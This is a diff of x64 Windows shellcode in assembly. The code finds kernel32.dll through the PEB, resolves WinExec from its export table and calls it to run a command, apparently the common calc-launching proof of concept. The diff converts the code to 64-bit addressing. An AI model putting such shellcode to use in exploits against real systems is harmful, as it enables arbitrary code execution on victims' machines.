@@ -21,7 +21,7 @@
  ;  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR 
  ;  OTHER DEALINGS IN THE SOFTWARE.
  ;
- ;  Size: 98 bytes
+ ;  Size: 105 bytes
  ;
     .x64
     ifndef TEST_CODE
@@ -33,43 +33,41 @@ entrypoint:
     push   rsi
     push   rdi
     push   rbp
-    
-    mov    r15, rsp
-    and    rsp, -16
-    sub    rsp, 28h
+    sub    rsp, 48h 
     jmp    init_cmd
 calc_pos:
     push   60h
     pop    rcx
     mov    rsi, [gs:rcx]
-    mov    esi, [rsi+18h]
-    mov    esi, [rsi+10h]               ; InLoadOrderModuleList
-    lodsd                               ; skip ntdll.dll
-    mov    esi, [rax]                   ; kernel32.dll
-    mov    edi, [rsi+30h]               ; LDR_DATA_TABLE_ENTRY.DllBase    
-    add    ecx, dword ptr[rdi+3ch]
-    mov    ebx, dword ptr[rdi+rcx+28h]
+    mov    rsi, [rsi+18h]
+    mov    rsi, [rsi+10h]
+    lodsq
+    mov    rsi, [rax]
+    mov    rdi, [rsi+30h] 
+    add    ecx, [rdi+3ch]
+    mov    ebx, [rdi+rcx+28h]
     
-    mov    esi, dword ptr[rdi+rbx+20h]
-    add    esi, edi
+    mov    esi, [rdi+rbx+20h]
+    add    rsi, rdi
     
-    mov    ecx, dword ptr[rdi+rbx+24h]
-    add    ecx, edi
-    cdq
+    mov    ecx, [rdi+rbx+24h]
+    add    rcx, rdi
+    xor    edx, edx
 find_loop:
-    movzx  ebp, word ptr[rcx+2*rdx]
+    movzx  ebp, word ptr[rcx+rdx*2]
     inc    edx
     lodsd
     cmp    dword ptr[rdi+rax], 'EniW'
     jne    find_loop
-
-    mov    esi, dword ptr[rdi+rbx+1ch]
-    add    esi, edi
-    add    edi, [rsi+4*rbp]
-    cdq    
+    
+    mov    esi, [rdi+rbx+28]
+    add    rsi, rdi
+    mov    eax, [rsi+rbp*4]
+    add    rax, rdi
+    xor    edx, edx    
     pop    rcx
-    call   rdi
-    mov    rsp, r15
+    call   rax
+    add    rsp, 48h
     
     pop    rbp
     pop    rdi
